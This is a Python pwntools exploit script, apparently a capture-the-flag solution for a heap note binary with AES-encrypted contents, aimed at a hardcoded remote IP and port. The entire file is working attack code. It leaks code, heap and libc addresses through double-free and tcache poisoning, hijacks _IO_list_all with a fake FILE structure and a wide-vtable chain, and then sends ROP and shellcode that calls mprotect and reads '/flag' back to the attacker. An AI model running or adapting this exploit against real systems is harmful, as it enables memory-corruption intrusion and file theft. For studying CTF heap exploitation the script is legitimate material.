#!/usr/bin/env python3
from pwn import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

context(log_level='debug', arch='amd64', os='linux')
#context.terminal = ["tmux", "splitw", "-h"]
uu64 = lambda x: u64(x.ljust(8, b'\x00'))
s = lambda x: p.send(x)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)
r = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)

k = 0
if k:
    addr = ''
    host = addr.split(':')
    p = remote(host[0], host[1])
else:
    p = process('./heap')
elf = ELF('./heap')
libc = ELF('./libc.so.6')
p = remote("8.147.129.227",37003)


def debug():
    gdb.attach(p, 'b *\nc\n')


hint = b'>> '

def add(idx, data):
    sla(hint, b'1')
    sla(b'idx', str(idx))
    sa(b'content', data)


def free(idx):
    sla(hint, b'2')
    sla(b'idx', str(idx))


def edit(idx, data):
    sla(hint, b'4')
    sla(b'idx', str(idx))
    sa(b'content', data)


def show(idx):
    sla(hint, b'3')
    sla(b'idx', str(idx))


def encrypt(data, key):
    data = pad(data, 16)

    cipher = AES.new(key, AES.MODE_ECB)

    encrypted_data = b''
    for i in range(0, len(data), 16):
        encrypted_data += cipher.encrypt(data[i : i + 16])

    return encrypted_data


def decrypt(encrypted_data, key):
    assert len(key) == 16, "Key must be 128 bits (16 bytes)."

    cipher = AES.new(key, AES.MODE_ECB)

    decrypted_data = b''
    for i in range(0, len(encrypted_data), 16):
        decrypted_data += cipher.decrypt(encrypted_data[i : i + 16])

    return decrypted_data


add(0, b'A' * 0x10)
show(0)
ru(b'A' * 0x10)
code_base = uu64(r(6)) - 0x1BF0

add(1, b'A' * 0x10)
free(1)
edit(1, b'A' * 0x10)
free(1)

free(0)
show(0)
ru(b': ')
data = r(0x10)

edit(1, b'A' * 0x10)
free(1)

add(2, b'\xa0')
show(2)

add(3, b'\x00')
add(2, b'\x00')
add(0, b'b' * 0x10)
key = b'\x4c\x69\xd8\xb1\x03\xb8\x07\x68\x33\x63\xbc\x0d\xb9\x8f\x6a\xb0'

show(1)
ru(b': ')
data = r(0x10)
heap_base = uu64(encrypt(data, key)[:8]) - 0x200

free(3)
edit(3, decrypt(b'\x00' * 0x10, key))
free(3)
edit(3, p64(heap_base + 0x330))
add(3, b'\x00')
add(4, decrypt(p64(0) + p64(0x20CD1), key))  # any

add(5, b'\x00' * 0x10)

for i in range(0x8):
    add(15 - i, b'\x00')

for i in range(0x13 - 0x8):
    add(6, b'\x00')

add(6, decrypt(p64(0) + p64(0x31), key))

edit(4, decrypt(p64(0) + p64(0x511), key))
free(5)
show(5)
ru(b': ')
data = r(0x10)
libc_base = uu64(encrypt(data, key)[:8]) - 0x1ECBE0
libc.address = libc_base

edit(4, decrypt(p64(0) + p64(0x41), key))

free(15)
edit(15, decrypt(p64(666) * 2, key))
free(14)
edit(14, decrypt(p64(heap_base + 0x10) * 2, key))
add(14, b'\x00')
add(0, p64(0))

free(15)
edit(15, decrypt(p64(666) * 2, key))
free(14)
edit(14, decrypt(p64(heap_base + 0x10 + 0xA0) * 2, key))
add(14, b'\x00')
add(1, p64(0))

free(15)
edit(15, decrypt(p64(666) * 2, key))
free(14)
edit(14, decrypt(p64(heap_base + 0x10 + 0xA0 + 0x30) * 2, key))
add(14, b'\x00')
add(2, p64(0))

free(15)
edit(15, decrypt(p64(666) * 2, key))
free(14)
edit(14, decrypt(p64(heap_base + 0x300) * 2, key))
add(14, b'\x00')
add(3, p64(0))

free(15)
edit(15, decrypt(p64(666) * 2, key))
free(14)
edit(14, decrypt(p64(heap_base + 0x300 + 0x30) * 2, key))
add(14, b'\x00')
add(4, p64(0))

free(15)
edit(15, decrypt(p64(666) * 2, key))
free(14)
edit(14, decrypt(p64(heap_base + 0x300 + 0x60) * 2, key))
add(14, b'\x00')
add(5, p64(0))

for i in range(0x7):
    free(15)
    edit(15, decrypt(p64(666) * 2, key))

free(15)
free(14)
pause()
edit(14, p64(libc.sym._IO_list_all - 0x18))
edit(15, p64(heap_base + 0x380))

for i in range(7):
    add(15, p64(heap_base + 0x380))

show(0)
add(15, b'\x00')

fake_IO_FILE = heap_base + 0x10
_IO_wfile_jumps = libc.sym._IO_wfile_jumps

payload = flat(
    {
        0x0: uu64(b"  sh"),
        0x8: libc_base + 0x000000000002F70A,  #: pop rsp; ret;
        0x10: heap_base + 0x300,
        0x28: 0xB81,  # _IO_write_ptr
        0xA0: fake_IO_FILE + 0xE8 - 0xE0,  # _wide_data->_wide_vtable
        0xD8: _IO_wfile_jumps,  # vtable
        0xE0: libc_base + 0x5B4D0,  # function
        0xE8: fake_IO_FILE + 0xE0 - 0x68,  # _wide_data->_wide_vtable->doallocate
    },
    filler=b'\x00',
)


edit(0, decrypt(payload[:0x30], key))
edit(1, decrypt(payload[0xA0 : 0xA0 + 0x30], key))
edit(2, decrypt(payload[0xA0 + 0x30 : 0xA0 + 0x60], key))

rdi = libc_base + 0x0000000000023B6A
rsi = libc_base + 0x000000000002601F
rdx_rbx = libc_base + 0x000000000015FAE6

payload = flat([rdi, heap_base, rsi, 0x2000, rdx_rbx, 7, 0, libc.sym.mprotect, heap_base + 0x360]).ljust(0x60, b'\x00')
payload += asm(shellcraft.read(0, heap_base + 0x360, 0x1000))
payload = pad(payload, 16)
edit(3, decrypt(payload[:0x30], key))
edit(4, decrypt(payload[0x30 : 0x30 + 0x30], key))
edit(5, decrypt(payload[0x30 + 0x30 : 0x30 + 0x60], key))

sla(hint, b'5')

sleep(0.5)
s(b'\x90' * 0x30 + asm(shellcraft.open('/flag', 0, 0) + shellcraft.sendfile(1, 3, 0, 0x1000) ) )

p.interactive()
